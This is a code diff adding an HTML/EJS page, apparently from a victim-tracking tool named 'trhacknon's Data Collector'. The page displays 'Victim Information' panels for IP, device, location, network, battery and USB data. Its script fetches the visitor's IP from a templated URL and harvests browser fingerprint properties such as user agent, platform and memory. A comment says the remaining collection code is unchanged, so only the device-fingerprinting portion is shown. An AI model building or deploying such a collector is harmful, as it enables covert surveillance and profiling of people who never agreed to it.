@@ -1,0 +1,145 @@
+<html lang="en-US">
+<head> 
+  <meta charset="UTF-8"> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
+  <meta name="robots" content="noindex, nofollow"> 
+  <meta name="viewport" content="width=device-width,initial-scale=1"> 
+  <title>trhacknon's Data Collector</title> 
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    h1 {
+      color: #333;
+    }
+    .section {
+      margin-bottom: 20px;
+    }
+    .section-title {
+      font-size: 18px;
+      font-weight: bold;
+      color: #555;
+      margin-bottom: 10px;
+    }
+    .info {
+      background-color: #eef;
+      padding: 10px;
+      border-radius: 5px;
+      margin-bottom: 10px;
+    }
+    .info b {
+      color: #333;
+    }
+    .highlight {
+      color: #d9534f;
+      font-weight: bold;
+    }
+    iframe { 
+      border: 0;
+      overflow: hidden;
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome, trhacknon</h1>
+    <center><img src="https://static-trkn.replit.app/trkn.svg" width="250"></center>
+
+    <div class="section">
+      <div class="section-title">✅ Victim Information</div>
+      <div class="info">
+        ⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">📱 Device Information</div>
+      <div id="device-info" class="info">
+        <!-- Device info will be dynamically added here -->
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">📷 Media Device Information</div>
+      <div id="media-info" class="info">
+        <!-- Media device info will be dynamically added here -->
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">🕸️ Network Information</div>
+      <div id="network-info" class="info">
+        <!-- Network info will be dynamically added here -->
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">📍 Location Information</div>
+      <div id="location-info" class="info">
+        <!-- Location info will be dynamically added here -->
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">🔋 Battery Information</div>
+      <div id="battery-info" class="info">
+        <!-- Battery info will be dynamically added here -->
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">🔌 USB Devices</div>
+      <div id="usb-info" class="info">
+        <!-- USB devices info will be dynamically added here -->
+      </div>
+    </div>
+
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+  <script type="text/javascript" defer>
+    var uid = "<%=uid %>";
+
+    async function gather() {
+      var td = "";
+
+      <% if (!t) { %>
+        td += `<code>✅Victim Information</code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>"><%=ip %></a> | Time: <%=time %></b>`;
+      <% } else { %>
+        await fetch("<%=a %>").then((r) => r.json()).then((d) => (td += `<code>✅Victim Information</code><br><br><b>⚓ IP: <a href="https://ip-api.com/#` + d.ip + `">` + d.ip + `</a> | Time: <%=time %></b>`));
+      <% } %>
+
+      td += `<br><br><b>⏳ Date In Victim's Device :</b> ` + new Date() + `<br>`;
+      var xo = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
+
+      td += `<br><b>📱 Device Information</b><br>`;
+      xo.forEach((key) => {
+        if (navigator[key]) {
+          td += `<b>` + key + `</b>: <code>` + navigator[key] + `</code><br>`;
+        }
+      });
+
+      document.getElementById("device-info").innerHTML = td;
+
+      // The rest of your script (network, USB, media device, etc.) remains the same.
+    }
+
+    gather();
+  </script>
+</body>
+</html>
